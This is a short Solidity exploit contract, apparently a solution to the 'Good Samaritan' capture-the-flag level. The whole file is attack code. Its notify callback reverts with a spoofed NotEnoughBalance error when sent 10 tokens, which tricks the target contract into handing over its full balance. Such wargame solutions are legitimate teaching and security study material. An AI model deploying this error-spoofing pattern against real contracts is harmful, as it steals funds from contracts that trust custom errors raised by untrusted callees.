// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INotifyable {
    function notify(uint256 amount) external;
}

interface IGoodSamaritan {
    function requestDonation() external returns (bool enoughBalance);
}

contract GoodSamaritanAttacker is INotifyable {
    error NotEnoughBalance();

    IGoodSamaritan addr;

    constructor(address _addr) {
        addr = IGoodSamaritan(_addr);
    }

    function callRequestDonation() external {
        addr.requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
